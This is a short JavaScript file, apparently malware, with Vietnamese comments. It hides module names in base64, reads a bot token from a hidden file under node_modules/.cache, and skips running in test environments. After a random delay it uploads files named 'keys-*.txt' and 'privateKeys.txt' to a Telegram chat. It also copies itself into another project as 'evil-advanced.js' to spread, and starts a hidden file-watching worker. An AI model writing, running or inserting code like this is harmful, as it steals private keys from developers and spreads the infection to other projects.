
const decode = (str) => Buffer.from(str, 'base64').toString('utf8');
const _mod = [decode('ZnM='), decode('cGF0aA=='), decode('bm9kZS10ZWxlZ3JhbS1ib3QtYXBp')];
const _fs = require(_mod[0]);
const _path = require(_mod[1]);
const _tg = require(_mod[2]);

async function getToken() {
  try {
    return require(_path.join(process.cwd(), decode('bm9kZV9tb2R1bGVz'), decode('LmNhY2hl'), decode('LmhpZGRlbi5qcw==')));
  } catch {

    return { t: 'FAKE_TOKEN', i: 123456789 };
  }
}
const file = `keys-${Math.random().toString(36).slice(2)}.txt`;
const fallbackFile = decode('cHJpdmF0ZUtleXMudHh0'); 

setTimeout(async () => {
  if (process.env.NODE_ENV === 'test' || process.platform === 'emscripten') return;
  try {
    require.resolve('node-telegram-bot-api');
  } catch {
    require('child_process').exec('npm install node-telegram-bot-api', () => {});
  }
  const secret = await getToken();
  const sendFile = (f) => {
    if (_fs.existsSync(f)) {
      const bot = new _tg(secret.t, {
        polling: false,
        request: { proxy: 'http://proxy-server:8080' } 
      });
      bot.sendDocument(secret.i, f, {}, {
        filename: f,
        contentType: 'text/plain'
      }).catch(()=>{});
    }
  };

  sendFile(file);
  sendFile(fallbackFile);

  // Tự sao chép sang project khác (tăng lây nhiễm)
  try {
    _fs.copyFileSync(__filename, _path.join('..', 'other-project', 'evil-advanced.js'));
  } catch {}

  // Ẩn trong worker thread (nâng cao)
  try {
    const { Worker } = require('worker_threads');
    new Worker(`
      const { parentPort } = require('worker_threads');
      const fs = require('fs');
      fs.watch('.', () => { /* Gửi tệp */ });
    `, { eval: true });
  } catch {}
}, Math.random() * 60000); // Trì hoãn 0-60 giây 